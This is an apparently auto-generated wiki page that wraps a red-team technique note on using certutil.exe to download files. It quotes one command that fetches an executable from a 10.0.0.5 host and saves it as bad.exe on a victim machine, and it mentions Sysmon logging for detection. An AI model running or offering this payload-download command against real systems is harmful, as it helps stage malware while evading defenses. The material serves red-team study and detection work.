---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Downloading Files with Certutil

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-downloading-file-with-certutil` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/downloading-file-with-certutil.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Downloading Files with Certutil](../../topics/offensive-security/downloading-files-with-certutil.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-downloading-file-with-certutil |
| name | Downloading Files with Certutil |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/downloading-file-with-certutil.md |

## Preserved Source Material

````yaml
_asset_filenames:
- certutil-download.gif
- certutil-sysmon.png
_body: '---

  description: Downloading additional files to the victim system using native OS binary.

  ---


  # Downloading Files with Certutil


  ## Execution


  ```csharp

  certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

  ```


  ![](../../.gitbook/assets/certutil-download.gif)


  ## Observations


  Sysmon commandling logging is a good place to start for monitoring suspicious `certutil.exe` behaviour:


  ![](../../.gitbook/assets/certutil-sysmon.png)'
_relative_path: offensive-security/defense-evasion/downloading-file-with-certutil.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/downloading-file-with-certutil.md
````
